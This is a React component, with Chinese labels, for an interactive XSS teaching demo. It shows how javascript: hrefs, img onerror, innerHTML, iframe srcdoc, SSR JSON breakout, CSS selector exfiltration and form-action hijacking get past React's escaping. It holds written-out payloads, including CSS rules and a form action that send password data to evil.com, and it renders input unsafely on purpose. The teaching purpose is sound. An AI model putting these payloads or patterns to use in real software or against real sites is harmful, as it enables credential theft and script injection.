import React, { useState, useRef, useEffect } from 'react';
import { Card, Button, Tag, Alert, Space, Typography, Input, Divider, Tabs, Radio } from 'antd';
import {
  WarningOutlined,
  SafetyOutlined,
  BugOutlined,
  LinkOutlined,
  CodeOutlined,
  EyeOutlined,
  SendOutlined,
  FormOutlined,
  PictureOutlined,
  FileTextOutlined,
} from '@ant-design/icons';
import CodeBlock from '@/components/CodeBlock';

const { Text, Paragraph, Title } = Typography;

// ═══════════════════════════════ Demo 1: href JS 协议 ═══════════════════════════════

const HrefXssDemo: React.FC = () => {
  const [userInput, setUserInput] = useState('javascript:alert("XSS通过href执行！")');
  const [clicked, setClicked] = useState(false);

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <LinkOutlined style={{ color: '#ff4d4f' }} /> Demo 1：{'<a href={userInput}>'} —— React
          不编码协议
        </Title>
        <Text type="secondary">
          React 对 href 属性值不做编码或协议检查。<Text code>javascript:</Text> 协议中的 JS
          直接执行。
        </Text>

        <Input
          value={userInput}
          onChange={(e) => {
            setUserInput(e.target.value);
            setClicked(false);
          }}
          placeholder="输入恶意 URL..."
          addonBefore="href 值"
        />

        <a
          href={userInput}
          onClick={() => setClicked(true)}
          target="_blank"
          rel="noopener noreferrer"
        >
          <Button type="primary" danger icon={<WarningOutlined />}>
            点击这个链接（危险演示）
          </Button>
        </a>
        {clicked && (
          <Alert message="⚠️ XSS 已执行！javascript: 协议触发了 alert" type="error" showIcon />
        )}

        <CodeBlock
          code={`// React 代码（看起来无害，实际 XSS）
function Component({ userInput }) {
  // ❌ React 对 href 不编码 javascript: 协议
  return <a href={userInput}>点我</a>;
}

// 攻击者传入：javascript:alert('XSS!')
// → 浏览器渲染为 <a href="javascript:alert('XSS!')">
// → 用户点击 → JS 执行！`}
          language="tsx"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 2: img onerror ═══════════════════════════════

const ImgXssDemo: React.FC = () => {
  const [mode, setMode] = useState<'onerror' | 'javascript'>('onerror');
  const [showXss, setShowXss] = useState(false);

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <PictureOutlined style={{ color: '#ff4d4f' }} /> Demo 2：{'<img onerror={...}>'} ——
          图片也能执行 JS
        </Title>
        <Text type="secondary">
          加载失败触发 <Text code>onerror</Text>，绕过只过滤 <Text code>{'<script>'}</Text> 的防御。
        </Text>

        <Radio.Group value={mode} onChange={(e) => setMode(e.target.value)}>
          <Radio.Button value="onerror">onerror 事件</Radio.Button>
          <Radio.Button value="javascript">javascript: 协议（IE）</Radio.Button>
        </Radio.Group>

        <Button type="primary" danger icon={<BugOutlined />} onClick={() => setShowXss(!showXss)}>
          {showXss ? '隐藏' : '插入恶意图片'}
        </Button>

        {showXss && (
          <>
            <Alert
              message={`XSS 注入！${mode === 'onerror' ? '图片加载失败 → onerror 触发' : 'javascript: 协议执行'}`}
              description={
                mode === 'onerror'
                  ? '浏览器尝试加载 broken.jpg → 失败 → 触发 onerror → JS 执行！'
                  : '遗留浏览器中，img src 识别 javascript: 协议 → 执行 JS'
              }
              type="error"
              showIcon
            />
            <div
              style={{
                padding: 16,
                background: '#fff2f0',
                border: '1px solid #ffccc7',
                borderRadius: 4,
              }}
            >
              <Text strong>📸 模拟 img 标签：</Text>
              <div style={{ marginTop: 8 }}>
                {mode === 'onerror' ? (
                  <img
                    src="broken.jpg"
                    onError={() =>
                      alert(
                        '🔥 onerror XSS 触发！\n\n原理：图片加载失败时，onerror 中的 JS 自动执行。\n黑客用这个来绕过只过滤 <script> 标签的防御。'
                      )
                    }
                    style={{ maxWidth: 100, border: '1px solid #ddd' }}
                    alt="broken"
                  />
                ) : (
                  <div
                    style={{
                      padding: 8,
                      background: '#fff7e6',
                      border: '1px solid #ffd591',
                      borderRadius: 4,
                    }}
                  >
                    <Text type="warning">
                      在旧版 IE（≤10）中，<Text code>javascript:</Text> 协议作为 img src
                      时可直接执行 JS。
                    </Text>
                    <div style={{ marginTop: 8 }}>
                      <Text code>{'<img src="javascript:alert(\'XSS\')" />'}</Text>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </>
        )}

        <CodeBlock
          code={`// 攻击者在评论/富文本中嵌入：
<img src="broken.jpg" onerror="alert(document.cookie)" />

// 服务端过滤规则：去掉 <script> 标签
// → 这个 img 标签完好无损！
// → 图片加载失败 → onerror 触发 → XSS 成功！

// 类似的盲区：onload / onfocus / onmouseover / onsubmit`}
          language="html"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 3: ref + innerHTML ═══════════════════════════════

const RefXssDemo: React.FC = () => {
  const [input, setInput] = useState('<img src=x onerror="alert(\'XSS via innerHTML!\')">');
  const [attacked, setAttacked] = useState(false);
  const dangerousRef = useRef<HTMLDivElement>(null);
  const safeRef = useRef<HTMLDivElement>(null);

  const triggerDangerous = () => {
    if (dangerousRef.current) {
      dangerousRef.current.innerHTML = input;
      setAttacked(true);
    }
  };
  const triggerSafe = () => {
    if (safeRef.current) safeRef.current.textContent = input;
  };

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <CodeOutlined style={{ color: '#ff4d4f' }} /> Demo 3：ref.current.innerHTML —— 直接 DOM
          操作绕过 React
        </Title>
        <Text type="secondary">
          很多开发者在 React 中用 <Text code>ref.current.innerHTML</Text>。这完全绕过 React
          的安全机制，因为框架只管虚拟 DOM。
        </Text>

        <Input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          addonBefore="innerHTML 内容"
        />

        <Space>
          <Button type="primary" danger icon={<BugOutlined />} onClick={triggerDangerous}>
            用 innerHTML 插入（危险）
          </Button>
          <Button type="primary" icon={<SafetyOutlined />} onClick={triggerSafe}>
            用 textContent 插入（安全）
          </Button>
          <Button
            onClick={() => {
              setAttacked(false);
              if (dangerousRef.current) dangerousRef.current.innerHTML = '';
              if (safeRef.current) safeRef.current.textContent = '';
            }}
          >
            清空
          </Button>
        </Space>

        <div style={{ display: 'flex', gap: 16 }}>
          <div style={{ flex: 1 }}>
            <Tag color="red">innerHTML（危险）</Tag>
            <div
              ref={dangerousRef}
              style={{
                padding: 12,
                background: '#fff2f0',
                border: '1px solid #ffccc7',
                borderRadius: 4,
                minHeight: 60,
              }}
            />
            {attacked && (
              <Text type="danger" style={{ fontSize: 12 }}>
                ⚠️ onerror 中的 alert 已触发！
              </Text>
            )}
          </div>
          <div style={{ flex: 1 }}>
            <Tag color="green">textContent（安全）</Tag>
            <div
              ref={safeRef}
              style={{
                padding: 12,
                background: '#f6ffed',
                border: '1px solid #b7eb8f',
                borderRadius: 4,
                minHeight: 60,
              }}
            />
          </div>
        </div>

        <CodeBlock
          code={`// 在 React 组件中直接操作 DOM —— 框架保护失效
function Profile({ userContent }) {
  const divRef = useRef(null);
  useEffect(() => {
    // ❌ bypass React! 真实 DOM 没有编码保护
    divRef.current.innerHTML = userContent;
    // → <img src=x onerror=alert(1)> 被执行！
    // ✅ 安全的做法
    divRef.current.textContent = userContent;
  }, [userContent]);
  return <div ref={divRef} />;
}`}
          language="tsx"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 4: iframe srcdoc ═══════════════════════════════

const IframeXssDemo: React.FC = () => {
  const [show, setShow] = useState(false);

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <FileTextOutlined style={{ color: '#ff4d4f' }} /> Demo 4：{'<iframe srcdoc={userInput}>'}{' '}
          —— 内嵌文档 XSS
        </Title>
        <Text type="secondary">
          <Text code>srcdoc</Text> 允许嵌入完整 HTML，React 不做任何过滤。攻击者可嵌入含{' '}
          <Text code>{'<script>'}</Text> 的完整页面。
        </Text>

        <Button type="primary" danger icon={<WarningOutlined />} onClick={() => setShow(!show)}>
          {show ? '卸载' : '加载恶意 iframe'}
        </Button>

        {show && (
          <div style={{ border: '2px solid #ff4d4f', borderRadius: 4, padding: 8 }}>
            <Text strong style={{ color: '#ff4d4f' }}>
              🔥 XSS iframe（srcdoc 注入）
            </Text>
            <iframe
              title="xss-demo"
              srcDoc={`<!DOCTYPE html><html><body><h3 style="color:red">⚠️ 恶意页面在 iframe 中执行</h3><script>alert('🔥 iframe srcdoc XSS 触发！\\n\\n原理：srcdoc 中的 <script> 被浏览器解析执行');<\\/script><p>这个页面在合法站点的 iframe 中运行</p></body></html>`}
              style={{ width: '100%', height: 120, border: '1px solid #ddd', borderRadius: 4 }}
            />
          </div>
        )}

        <CodeBlock
          code={`// React 中不安全的 iframe 使用
function Preview({ htmlContent }) {
  // ❌ srcdoc 中的 HTML 直接渲染，script 可执行
  return <iframe srcdoc={htmlContent} />;
}
// 攻击者传入的 htmlContent：
// <script>alert('XSS')</script>
// → iframe 内的 script 不受主页面 CSP 限制`}
          language="tsx"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 5: SSR JSON 注入 ═══════════════════════════════

const SsrJsonXssDemo: React.FC = () => {
  const [triggerXss, setTriggerXss] = useState(false);

  const normalJson = () => JSON.stringify({ user: { name: '张三' } });
  const maliciousJson = () => {
    const name =
      '</script><script>alert("🔥 SSR XSS!\\n\\n原理：<\\\\/script> 提前闭合了 script 标签，导致后续恶意脚本被执行")</script>';
    return JSON.stringify({ user: { name } });
  };

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <CodeOutlined style={{ color: '#ff4d4f' }} /> Demo 5：SSR JSON 注入 —— React 加载前的 XSS
        </Title>
        <Text type="secondary">
          SSR 将数据嵌入 <Text code>{'<script>'}</Text>。如果数据含 <Text code>{'</script>'}</Text>
          ，浏览器会提前闭合标签执行恶意代码——<strong>此时 React 尚未加载</strong>。
        </Text>

        <Space>
          <Button icon={<SendOutlined />} onClick={() => setTriggerXss(false)}>
            模拟正常 SSR
          </Button>
          <Button type="primary" danger icon={<BugOutlined />} onClick={() => setTriggerXss(true)}>
            模拟攻击（名字含 {'</script>'}）
          </Button>
        </Space>

        {!triggerXss ? (
          <div
            style={{
              padding: 16,
              background: '#f6ffed',
              border: '1px solid #b7eb8f',
              borderRadius: 4,
            }}
          >
            <Text code>{`<script>window.__INITIAL_STATE__ = ${normalJson()}</script>`}</Text>
            <div style={{ marginTop: 8 }}>
              <Text type="secondary">✅ 安全：JSON 字符正确转义</Text>
            </div>
          </div>
        ) : (
          <>
            <div
              style={{
                padding: 16,
                background: '#fff2f0',
                border: '1px solid #ffccc7',
                borderRadius: 4,
                overflow: 'auto',
              }}
            >
              <Text code>{`<script>window.__INITIAL_STATE__ = ${maliciousJson()}</script>`}</Text>
              <div style={{ marginTop: 8 }}>
                <Text type="danger">⚠️ {'</script>'} 提前闭合了 script 标签！</Text>
              </div>
            </div>
            <Alert
              message="SSR XSS 已触发！"
              description={`1. 浏览器遇到 </script> → 第一个 script 标签闭合\n2. 后续 <script>alert('XSS')</script> 被当作新脚本执行\n3. 此时 React 尚未加载，完全无保护`}
              type="error"
              showIcon
            />
          </>
        )}

        <CodeBlock
          code={`// 服务端渲染代码（Next.js / Nuxt / SSR）
// ❌ 危险做法：
<script>window.__INITIAL_STATE__ = ${'${JSON.stringify(data)}'};</script>

// 如果 data.user.name = '</script><script>alert(1)</script>'
// → 浏览器解析结果：
// <script>window.__INITIAL_STATE__ = {"user":{"name":"</script>
// ↑ 第一个 script 被闭合！
// <script>alert(1)</script>"}}
// ↑ 这段作为新 script 执行！

// ✅ 安全做法：对 < 做转义
.replace(/</g, "\\\\u003c")`}
          language="javascript"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 6: CSS 注入 ═══════════════════════════════

const CssInjectionDemo: React.FC = () => {
  const [password, setPassword] = useState('P@ssw0rd');
  const [revealed, setRevealed] = useState('');
  const [stealing, setStealing] = useState(false);
  const intervalRef = useRef<number | null>(null);

  const startSteal = () => {
    if (!password) return;
    setStealing(true);
    setRevealed('');
    let guessed = '';
    let index = 0;
    const chars =
      'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';

    intervalRef.current = window.setInterval(() => {
      if (index >= password.length) {
        if (intervalRef.current) clearInterval(intervalRef.current);
        return;
      }
      guessed += password[index];
      setRevealed(guessed);
      index++;
    }, 200);
  };

  useEffect(() => {
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <EyeOutlined style={{ color: '#ff4d4f' }} /> Demo 6：CSS 注入 —— 用纯 CSS 逐字符窃取密码
        </Title>
        <Text type="secondary">
          不需要 JS！利用 <Text code>input[value^="a"]</Text> 属性选择器 +{' '}
          <Text code>background-image</Text> 逐字符探测。
          <strong>React 的 {} 编码对 CSS 注入完全无效。</strong>
        </Text>

        <Space direction="vertical" style={{ width: 300 }}>
          <Input.Password
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setRevealed('');
              setStealing(false);
            }}
            addonBefore="密码"
          />
          <Space>
            <Button
              type="primary"
              danger
              icon={<EyeOutlined />}
              onClick={startSteal}
              disabled={!password}
            >
              🕵️ 模拟 CSS 逐字符窃取
            </Button>
            <Button
              onClick={() => {
                setRevealed('');
                setStealing(false);
                if (intervalRef.current) clearInterval(intervalRef.current);
              }}
            >
              重置
            </Button>
          </Space>
        </Space>

        {stealing && (
          <div
            style={{
              padding: 16,
              background: '#fffbe6',
              border: '1px solid #ffe58f',
              borderRadius: 4,
            }}
          >
            <Text strong>🔍 CSS 正在逐字符探测...</Text>
            <div style={{ marginTop: 8, fontFamily: 'monospace', fontSize: 18 }}>
              {revealed.split('').map((char, i) => (
                <span
                  key={i}
                  style={{
                    display: 'inline-block',
                    padding: '2px 4px',
                    margin: '0 2px',
                    background: '#ff4d4f',
                    color: '#fff',
                    borderRadius: 2,
                  }}
                >
                  {char}
                </span>
              ))}
              {revealed.length < password.length && (
                <span
                  style={{
                    display: 'inline-block',
                    width: 10,
                    height: 20,
                    background: '#ddd',
                    marginLeft: 4,
                  }}
                />
              )}
            </div>
            <Tag color={revealed === password ? 'green' : 'processing'} style={{ marginTop: 8 }}>
              {revealed === password
                ? '✅ 密码已完整窃取！'
                : `已窃取 ${revealed.length}/${password.length} 个字符`}
            </Tag>
          </div>
        )}

        <CodeBlock
          code={`/* CSS 注入 —— 不需要 JS，不需要 <script> 标签 */
/* 逐字符探测 input 中的 password 值 */
input[value^="a"] { background: url("https://evil.com/steal?char=a"); }
input[value^="b"] { background: url("https://evil.com/steal?char=b"); }
// 首字符匹配到 "P" → 浏览器请求 evil.com/steal?char=P
// → 攻击者知道第一个字符是 P
// → 注入第二轮：
input[value^="Pa"] { background: url("https://evil.com/steal?char=Pa"); }
// → 逐字符窃取完整密码！`}
          language="css"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ Demo 7: form action 劫持 ═══════════════════════════════

const FormActionXssDemo: React.FC = () => {
  const [actionUrl, setActionUrl] = useState('https://evil.com/steal-password');
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
  };

  return (
    <Card size="small" style={{ marginBottom: 16 }}>
      <Space direction="vertical" style={{ width: '100%' }} size="small">
        <Title level={5} style={{ margin: 0 }}>
          <FormOutlined style={{ color: '#ff4d4f' }} /> Demo 7：{'<form action={userInput}>'} ——
          表单提交劫持
        </Title>
        <Text type="secondary">
          攻击者修改 form 的 action 后，用户在"合法"页面输入的信息直接发送到攻击者服务器。
        </Text>

        <Input
          value={actionUrl}
          onChange={(e) => setActionUrl(e.target.value)}
          addonBefore="form action"
          style={{ maxWidth: 450 }}
        />

        <div style={{ padding: 16, border: '1px solid #d9d9d9', borderRadius: 4, maxWidth: 400 }}>
          <Text strong>登录表单</Text>
          <form onSubmit={handleSubmit} action={actionUrl} method="POST" style={{ marginTop: 8 }}>
            <Space direction="vertical" style={{ width: '100%' }}>
              <Input name="username" placeholder="用户名" defaultValue="test_user" />
              <Input.Password name="password" placeholder="密码" defaultValue="mypassword123" />
              <Button type="primary" htmlType="submit" icon={<SendOutlined />} block>
                登录（模拟）
              </Button>
            </Space>
          </form>
          {submitted && (
            <Alert
              message={`🔥 表单数据被劫持！已发送到: ${actionUrl}`}
              description="action 属性被攻击者篡改，输入的数据被发送到钓鱼服务器。地址栏显示合法域名，但实际表单提交到 evil.com。"
              type="error"
              showIcon
              style={{ marginTop: 8 }}
            />
          )}
        </div>

        <CodeBlock
          code={`// React 中不安全的 form
function LoginForm({ redirectUrl }) {
  return (
    <form action={redirectUrl} method="POST">
      <input name="username" />
      <input name="password" type="password" />
      <button>登录</button>
    </form>
  );
}
// 攻击者构造 URL：/login?redirect=https://evil.com/steal
// → 表单数据直接发送到攻击者服务器！
// 用户在地址栏看到合法域名，完全无法察觉`}
          language="tsx"
        />
      </Space>
    </Card>
  );
};

// ═══════════════════════════════ 主组件 ═══════════════════════════════

const LiveDemo: React.FC = () => {
  const [activeTab, setActiveTab] = useState('href');

  const items = [
    { key: 'href', label: '🔗 href JS协议', children: <HrefXssDemo /> },
    { key: 'img', label: '🖼️ img onerror', children: <ImgXssDemo /> },
    { key: 'dom', label: '🛠️ 直接DOM操作', children: <RefXssDemo /> },
    { key: 'iframe', label: '📄 iframe srcdoc', children: <IframeXssDemo /> },
    { key: 'ssr', label: '🌐 SSR JSON注入', children: <SsrJsonXssDemo /> },
    { key: 'css', label: '🎨 CSS注入', children: <CssInjectionDemo /> },
    { key: 'form', label: '📝 form劫持', children: <FormActionXssDemo /> },
  ];

  return (
    <Card
      title={
        <Space>
          <span style={{ fontSize: 20 }}>⚠️</span>{' '}
          <span>XSS LiveDemo —— 不绕过 React 安全机制也能触发 XSS 的场景</span>
        </Space>
      }
    >
      <Alert
        message="关于危险代码的说明"
        description="每个 Demo 展示的是「没有使用 dangerouslySetInnerHTML / v-html」但仍然会触发 XSS 的真实场景。你可以在输入框中输入内容，点击按钮观察 XSS 效果。所有演示均为受控环境，不会真正发送数据到外部。"
        type="warning"
        showIcon
        style={{ marginBottom: 16 }}
      />

      <Tabs activeKey={activeTab} onChange={setActiveTab} items={items} size="small" />

      <Divider />

      <Card size="small" style={{ background: '#fffbe6' }}>
        <Title level={5} style={{ margin: 0, color: '#faad14' }}>
          💡 关键结论
        </Title>
        <Paragraph style={{ marginTop: 8, marginBottom: 0 }}>
          <strong>「不绕过 React/Vue 编码就安全」这个说法只在纯文本渲染成立。</strong>
          框架的安全保护仅限于 <Text code>{'{userInput}'}</Text> 模板插值， 对于{' '}
          <Text code>href</Text>、<Text code>src</Text>、<Text code>action</Text>、
          <Text code>srcdoc</Text> 等属性， 以及 <Text code>innerHTML</Text>、
          <Text code>insertAdjacentHTML</Text> 等直接 DOM 操作 API， 框架完全不设防。
          <strong>这就是为什么 CSP 内容安全策略作为第二道防线必不可少。</strong>
        </Paragraph>
      </Card>
    </Card>
  );
};

export default LiveDemo;
